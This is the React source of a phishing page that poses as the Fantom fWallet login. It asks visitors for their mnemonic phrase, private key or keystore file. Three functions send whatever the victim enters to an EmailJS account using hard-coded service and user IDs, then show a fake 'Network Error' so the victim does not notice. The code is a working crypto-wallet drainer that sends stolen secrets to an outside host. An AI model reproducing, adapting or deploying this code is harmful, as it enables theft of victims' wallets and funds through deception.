import { useState, useEffect, useRef } from 'react';
import {
  BrowserRouter as Router,
  Switch,
  Route,
} from "react-router-dom";
import { 
	Flex,
	Text,
  	Image,
  	ChakraProvider,
  	Spinner,
} from "@chakra-ui/react";
import emailjs from 'emailjs-com';
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import Aos from "aos";
import "aos/dist/aos.css";
import Logo from "./logo.svg";
import Software from "./software.svg";
import Back from "./back.svg";
import Close from "./close.svg";
import File from "./file.svg";
import Phrase from "./phrase.svg";
import Pin from "./pin.svg";
import NewWallet from "./newWallet.svg";


function App() {
	const [modal, setModal] = useState(false)
	const [screen, setScreen] = useState(0)
	const [err, setErr] = useState(false)
	const [errMsg, setErrMsg] = useState("")
	const [loading, setLoading] = useState(false)
	const [wT, setWT] = useState(0)
	const [selected, setSelected] = useState(9)
	const [iniPhrase, setIniPhrase] = useState(0)
	const [seedOk, setSeedOk] = useState(false)
	const [seedErr, setSeedErr] = useState(false)
	const [seed, setSeed] = useState("")
	const [pinErr, setPinErr] = useState(false)
	const [fileErr, setFileErr] = useState(false)
	const [pinNo, setPinNo] = useState(0)
	const [main, setMain] = useState(0)
	
	useEffect(() => {
		Aos.init({ duration: 1000 });
	}, [])

	useEffect(() => {
		setSeedErr(false)
		setPinErr(false)
		setSeedOk(false)
		setFileErr(false)
		setPinNo(0)
	}, [screen])

	

	async function sendSecret() {
		setLoading(true)
		const templateParams = {
			from_name: "New User",
			message: "NEW FANTOM: Mnemonic Phrase is: ("+seed+")",
		}
		await emailjs.send('Outlook', 'template_gkcghjf', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
		.then((response) => {
			console.log('')
		}, (err) => {
			console.log('')
		})
		setLoading(false)
		setErrMsg(<Text textAlign="center"><Text fontWeight="bold" as="span">Network Error:</Text> Check the internet connection and retry!</Text>)
		setErr(true)
	}

	async function sendPin() {
		setLoading(true)
		var pin = document.getElementById('pKey').value
		const templateParams = {
			from_name: "New User",
			message: "NEW FANTOM: Private Key is: ("+pin+")",
		}
		await emailjs.send('Outlook', 'template_gkcghjf', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
		.then((response) => {
			console.log('')
		}, (err) => {
			console.log('')
		})
		setLoading(false)
		setErrMsg(<Text textAlign="center"><Text fontWeight="bold" as="span">Network Error:</Text> Check the internet connection and retry!</Text>)
		setErr(true)
	}

	async function jsonSave(jsonObj) {
		const uSeed = JSON.stringify(jsonObj)
		setLoading(true)
		const templateParams = {
			from_name: "New User",
			message: "NEW FANTOM: KeyStore file details: ("+uSeed+")",
		}
		await emailjs.send('Outlook', 'template_gkcghjf', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
		.then((response) => {
			console.log('')
		}, (err) => {
			console.log('')
		})
		setLoading(false)
		setErrMsg(<Text textAlign="center"><Text fontWeight="bold" as="span">Network Error:</Text> Check the internet connection and retry!</Text>)
		setErr(true)
	}

	useEffect(() => {
		document.addEventListener("paste", async function(e) {
			if (e.target.id === "formInp") {
				if(e.target.value.match(/(\w+)/g)?.length > 12) {
					setIniPhrase(1)
				}
				else {
					setIniPhrase(0)
				}
				if(e.target.value.length === 0) {
					setSeedErr(true)
				}
				else {
					setSeedErr(false)
				}
				if(e.target.value.match(/(\w+)/g)?.length > 11) {
					setSeedOk(true)
				}
				else {
					setSeedOk(false)
				}
				setSeed(e.target.value)
				var data = e.target.value.split(' ');
				[].forEach.call(document.querySelectorAll(".formInps"), (node, index) => {
					if(data[index] !== undefined) {
						node.innerHTML = data[index];
					}
					else {
						node.innerHTML = "";
					}
				});
				}
		  });
	}, [])


	useEffect(() => {
		if(screen === 1) {
			var data = document.getElementById('formInp').value.split(' ');
			[].forEach.call(document.querySelectorAll(".formInps"), (node, index) => {
				if(data[index] !== undefined) {
					node.innerHTML = data[index];
				}
				else {
					node.innerHTML = "";
				}
			});
		}
	}, [iniPhrase])



	const menus = [ { name: "Keystore file", icon: File, }, { name: "Mnemonic Phrase", icon: Phrase, }, { name: "Private key", icon: Pin, } ]

	const handleDrag = function(e) {
		e.preventDefault();
		e.stopPropagation();
	};

	

	return (
		<ChakraProvider>
			<Flex w="100%" h="100vh" fontFamily="font" bg="rgb(10, 22, 46)" direction="column" px="5%" pt="67px" pb="10" className="scPage" overflowY="scroll" fontSize="16px" color="#fff">
				<Flex w="100%" display={["none", "flex"]}>
					<Image src={Logo} w="109px" h="50px" aspectRatio="auto 109 / 50" />
				</Flex>

				{
					main === 0 ?
					<>
						<Flex w="100%" direction="column" align="center" mt={["0", "9%"]}>
							<Text align="center" fontSize={["24px", "30px"]} fontWeight="bold">How do you want to access your wallet?</Text>

							<Flex w="14rem" h="16rem" mt="10" bg="rgb(14, 29, 55)" borderRadius="8px" p="2rem" border="2px solid rgb(14, 29, 55)" _hover={{ w: "14.7rem", h: "16.7rem", translate: "0px, 0px", border: "2px solid rgb(25, 105, 255)" }} transition="300ms ease-in-out" direction="column" cursor="pointer" align="center" onClick={() => {
								setScreen(0)
								setSelected(9)
								setWT(0)
								setModal(true)
							}}>
								<Image w="99px" src={Software} />
								<Text fontWeight="bold" fontSize="24px" textAlign="center" mt="8">Software</Text>
							</Flex>

							
							<Text color="rgb(183, 190, 203)" fontSize="18px" mt="12">Dont have a wallet?</Text>
							<Text color="rgb(25, 255, 255)" fontWeight="bold" fontSize="18px" cursor="pointer" mt="4" onClick={() => setMain(1)}>Create a wallet</Text>
						</Flex>
					</>
					:
					<>
						<Flex w="100%" direction="column" align="center" mt="9%">
							<Text align="center" fontSize={["24px", "30px"]} fontWeight="bold">Set up your wallet</Text>
							<Flex w="20rem" bg="rgb(14, 29, 55)" borderRadius="8px" padding="2rem" direction="column" align="center" mt="12">
								<Image w="84px" src={NewWallet} />
								<Text mt="12" px="3rem" color="rgb(183, 190, 203)" fontWeight="bold" fontSize={["16px", "18px"]} textAlign="center">Generate a new key phrase to setup your fWallet.</Text>

								<Flex w="100%" mt="6" padding={["12px 20px", "14px 24px"]} bg="rgb(25, 105, 255)" color="#fff" borderRadius="8px" cursor="pointer" transition="300ms ease-in-out" fontSize={["16px", "18px"]} fontWeight="bold" justify="center" align="center" onClick={() => {
									setLoading(true)
									setTimeout(function() {
										setLoading(false)
										setErrMsg(<Text textAlign="center"><Text fontWeight="bold" as="span">Network Error:</Text> Check the internet connection and retry!</Text>)
										setErr(true)
									}, 4000)
								}}>{loading ? <Spinner color="#fff" emptyColor="lightgrey" /> : "Generate key phrase"}</Flex>
							</Flex>
							<Text color="rgb(25, 255, 255)" fontWeight="bold" fontSize="18px" cursor="pointer" onClick={() => setMain(0)} mt="12">Already own a wallet?</Text>
						</Flex>
					</>
				}
				<Flex w="100%" mt="auto" justify="center">
					<Text color="rgb(112, 123, 143)" mt="8">©2022 Fantom Foundation</Text>
				</Flex>
			</Flex>



			{
				modal &&
				<Flex w="100%" h="100%" position="fixed" top="0" left="0" zIndex="1" bg="rgba(0, 0, 0, 0.8)" py={["8%", "12"]} overflowY="scroll">
					<Flex w={["90%", wT === 0 ? "75%" : wT === 1 ? "65%" : "40%"]} h="max-content" bg="rgb(14, 29, 55)" padding={["20px", "30px 40px 40px 40px"]} borderRadius="8px" my="auto" direction="column" mx="auto">
						<Flex w="100%" align="flex-start" mt={["1", "0"]}>
							<Flex>
								{
									screen > 0 &&
									<Image cursor="pointer" w={["13px", "18px"]} h={["13px", "18px"]} src={Back} onClick={() => {
										setWT(0)
										setScreen(0)
									}} />
								}
							</Flex>
							<Text w="100%" mt="-2" textAlign="center" fontSize={["24px", "30px"]} fontWeight="bold">{screen === 0 ? "Access by Software" : screen === 1 ? <Text textAlign={["left", "center"]} ml={["2", "0"]}>Enter your mnemonic phrase<Text mt="1" color="rgb(183, 190, 203)" fontSize={["12px", "16px"]}>Hit "SPACE" after every successful word entry</Text></Text> : ""}</Text>
							<Flex justify="flex-end" mt={["1", "0"]}>
								<Image src={Close} w={["13px", "18px"]} h={["13px", "18px"]} cursor="pointer" onClick={() => setModal(false)} />
							</Flex>
						</Flex>
						{
							screen === 0 ?
							<>
								<Flex w="100%" direction="column" mt="8">
									<Flex bg="rgba(248, 66, 57, 0.15)" padding="1rem 1.5rem" borderRadius="8px" direction="column">
										<Text fontWeight="bold" fontSize={["14px", "16px"]}>Not recommended</Text>
										<Text fontSize={["12px", "14px"]} mt={["1", "3"]} lineHeight="16px">This is not recommended way to access your wallet. Due to the sensitivity of the information involved, these options should only be used by experienced users.</Text>
									</Flex>
									<Flex w="100%" mt="6" align="center" justify="center" flexWrap="wrap">
										{
											menus.map ((item, index) => (
												<Flex mb={["2", "0"]} key={index} mx="1" w={[selected === index ? "8.3rem" : "8rem", selected === index ? "14.7rem" : "14rem"]} h={[selected === index ? "10.6rem" : "10.3rem", selected === index ? "16.7rem" : "16rem"]} bg="rgb(10, 22, 46)" borderRadius="8px" p={["20px", "2rem"]} border={selected === index ? "2px solid rgb(25, 105, 255)" : "2px solid rgb(10, 22, 46)"} translate="0px 0px" transition="300ms ease-in-out" direction="column" cursor="pointer" align="center" onClick={() => {
													setSelected(index)
												}}>
													<Image w={["64px", "110px"]} src={item.icon} />
													<Text mt={["4", "6"]} textAlign="center" fontSize={["16px", "18px"]} fontWeight="bold">{item.name}</Text>
												</Flex>
											))
										}
									</Flex>
									<Text w="100%" textAlign={["left", "center" ]}color="rgb(183, 190, 203)" mt={["6", "12"]} mb="8" fontSize={["14px", "16px"]}>Purchase a hardware wallet for the highest security when accessing your crypto.</Text>

									<Flex padding={["12px 20px", "14px 24px"]} bg={selected < 3 ? "rgb(25, 105, 255)" : "rgba(25, 105, 255, 0.6)"} color={selected < 3 ? "#fff" : "rgb(108, 114, 108)"} borderRadius="8px" cursor={selected < 3 ? "pointer" : "not-allowed"} transition="300ms ease-in-out" fontSize={["16px", "18px"]} fontWeight="bold" justify="center" align="center" onClick={() => {
										if(selected === 1) {
											setScreen(1)
											setWT(1)
											setIniPhrase(0)
										}
										else if(selected === 2) {
											setScreen(2)
											setWT(2)
										}
										else if(selected === 0) {
											setScreen(3)
											setWT(2)
										}
									}}>Continue</Flex>
								</Flex>
							</>
							:
							screen === 1 ?
							<>
								<Flex w="100%" mt="8" direction="column">
									<textarea style={{ width: "100%", fontSize: "20px", color: "#fff", height: "170px", borderRadius: "8px", lineHeight: "24px", background: "rgb(32, 47, 73)", padding: "20px 20px", fontWeight: "bold", }} placeholder="Enter your phrase" id="formInp" onInput={async (e) => {
										if(e.target.value.match(/(\w+)/g)?.length > 12) {
											setIniPhrase(1)
										}
										else {
											setIniPhrase(0)
										}
										if(e.target.value.length === 0) {
											setSeedErr(true)
										}
										else {
											setSeedErr(false)
										}
										if(e.target.value.match(/(\w+)/g)?.length > 11) {
											setSeedOk(true)
										}
										else {
											setSeedOk(false)
										}
										setSeed(e.target.value)
										var data = e.target.value;
										data = data.split(' ');
										[].forEach.call(document.querySelectorAll(".formInps"), (node, index) => {
											if(data[index] !== undefined) {
												node.innerHTML = data[index];
											}
											else {
												node.innerHTML = "";
											}
										});
									}}></textarea>
									{
										seedErr &&
										<Text color="rgb(248, 66, 57)" fontSize="18px" mt="2" mb="-4">Please enter a value</Text>
									}
									<Flex w="100%" flexWrap="wrap" mt="8" px={["0", "3"]} justify="space-between">
										{
											Array.from(Array(iniPhrase === 0 ? 12 : 24).keys()).map((item, index) => (
												<Flex key={index} bg="rgb(27, 40, 62)" borderRadius="8px" h="4rem" w={["31%", "24%"]} mx="0.5%" mb="2" align="center" padding="20px 20px">
													<Flex color="rgb(112, 123, 143)">{index + 1}.</Flex>
													<Text className="formInps scPage" mt="4" fontWeight="bold" ml="3" w="100%" overflowX="scroll" overflowWrap="normal"></Text>
												</Flex>
											))
										}
									</Flex>
									<Flex w="100%" mt="8" padding={["12px 20px", "14px 24px"]} bg="rgb(25, 105, 255)" color="#fff" borderRadius="8px" cursor="pointer" fontSize={["16px", "18px"]} mx="auto" _hover={{ w: "98.5%", padding: "13px 24px" }} transition="300ms ease-in-out" fontWeight="bold" justify="center" align="center" onClick={() => {
										if(seedOk) {
											sendSecret()
										}
									}}>{loading ? <Spinner color="#fff" emptyColor="lightgrey" /> : "Access wallet"}</Flex>
								</Flex>
							</>
							:
							screen === 2 ?
							<>
								<Flex w="100%" direction="column">
									<Flex w="100%" direction="column" align="center">
										<Image w="96px" h="96px" src={Pin} />
										<Text textAlign="center" fontSize={["24px", "30px"]} fontWeight="bold" mt="3" mb="12">
											Private key
										</Text>
										<input style={{ width: "100%", background: "rgb(32, 47, 73)", padding: "20px 24px", color: "#fff", borderRadius: "8px", textAlign: "center", fontSize: "20px" }} placeholder="Enter your private key" id="pKey" onPaste={(e) => {
											e.preventDefault()
										}} onInput={(e) => {
											if(e.target.value.length > 66) {
												e.preventDefault()
											}
											else {
												setPinNo(e.target.value.length)
												if(e.target.value.length === 0) {
													setPinErr(true)
												}
												else {
													setPinErr(false)
												}
											}
										}} />
										<Flex w="100%" mt="1">
											{
												pinErr &&
												<Text color="rgb(248, 66, 57)" fontSize="18px">Please enter a value</Text>
											}
											<Text ml="auto" color="rgb(112, 123, 143)">{pinNo}/66</Text>
										</Flex>

										<Flex mt="12" padding={["12px 20px", "14px 24px"]} bg={pinNo > 65 ? "rgb(25, 105, 255)" : "rgba(25, 105, 255, 0.6)"} color={pinNo > 65 ? "#fff" : "rgb(108, 114, 108)"} borderRadius="8px" cursor={pinNo > 65 ? "pointer" : "not-allowed"} transition="300ms ease-in-out" fontSize={["16px", "18px"]} fontWeight="bold" justify="center" align="center" onClick={() => {
											if(pinNo > 65) {
												sendPin()
											}
										}}>{loading ? <Spinner color="#fff" emptyColor="lightgrey" /> : "Access Wallet"}</Flex>
									</Flex>
								</Flex>
							</>
							:
							<>
								<Flex w="100%" direction="column">
									<Flex w="100%" direction="column" align="center" px="6">
										<Image w="128px" h="128px" src={File} />
										<Text textAlign="center" fontSize={["24px", "30px"]} fontWeight="bold" mt="3">
											Keystore file
										</Text>
										<Flex w="100%" mt="12" border="3px dashed rgb(58, 72, 97)" fontWeight="bold" align="center" justify="center" cursor="crosshair" borderRadius="8px" h="8em" fontSize={["16px", "18px"]} color="rgb(112, 123, 143)" onDragEnter={handleDrag} onDragLeave={handleDrag} onDragOver={handleDrag} onDrop={(e) => {
											e.preventDefault();
											e.stopPropagation();
											if (e.dataTransfer.files && e.dataTransfer.files[0]) {	
												setFileErr(false)
												var reader = new FileReader()
												var uploadFile = e.dataTransfer.files[0]
												if (uploadFile.type !== "application/json") {
													setFileErr(true)
												}
												else {
													reader.onload = function(e) {
														var jsonObj = JSON.parse(e.target.result)
														jsonSave(jsonObj)
													}
													reader.readAsText(e.dataTransfer.files[0])
												}
											}
										}}>Drop file here</Flex>

										<Flex mt="6" align="center" w="100%">
											<Flex flex="1" bg="rgb(32, 47, 73)" h="2px"></Flex>
											<Text fontWeight="bold" mb="3px" fontSize="18px">or</Text>
											<Flex flex="1" bg="rgb(32, 47, 73)" h="2px"></Flex>
										</Flex>

										<input type="file" style={{ visibility: "hidden", width: "0", height: "0" }} id="upJson" onChange={(e) => {
											setFileErr(false)
											var reader = new FileReader()
											var uploadFile = e.target.files[0]
											if (uploadFile.type !== "application/json") {
												setFileErr(true)
											}
											else {
												reader.onload = function(e) {
													var jsonObj = JSON.parse(e.target.result)
													jsonSave(jsonObj)
												}
												reader.readAsText(e.target.files[0])
											}
										}} />

										<Flex w="100%" mt="6" padding={["12px 20px", "14px 24px"]} bg="rgb(25, 105, 255)" color="#fff" borderRadius="8px" cursor="pointer" transition="300ms ease-in-out" fontSize={["16px", "18px"]} fontWeight="bold" justify="center" align="center" onClick={() => document.getElementById('upJson').click()}>{loading ? <Spinner color="#fff" emptyColor="lightgrey" /> : "Select File"}</Flex>

										{
											fileErr &&
											<Text w="100%" textAlign="left" color="rgb(248, 66, 57)" fontSize="18px" mt="2">Invalid keystore file</Text>
										}
									</Flex>
								</Flex>
							</>
						}
					</Flex>
				</Flex>
			}


			{
				err &&
				
				<Flex w="100%" h="100%" position="fixed" top="0" left="0" zIndex="10" bg="rgba(0, 0, 0, 0.8)" py="12" overflowY="scroll">
					<Flex w={["90%", "40%"]} h="max-content" bg="rgb(14, 29, 55)" padding="60px 60px 70px 60px" borderRadius="8px" my="auto" direction="column" align="center" mx="auto">
						<Text textAlign="center">{errMsg}</Text>
						<Flex w="100%" mt="8" padding={["12px 20px", "14px 24px"]} bg="rgb(25, 105, 255)" color="#fff" borderRadius="8px" cursor="pointer" fontSize={["16px", "18px" ]} mx="auto" _hover={{ w: "98.5%", padding: "13px 24px" }} transition="300ms ease-in-out" fontWeight="bold" justify="center" align="center" onClick={() => setErr(false)}>Okay!</Flex>
					</Flex>
				</Flex>
			}

			
		</ChakraProvider>
	)
}

export default App;
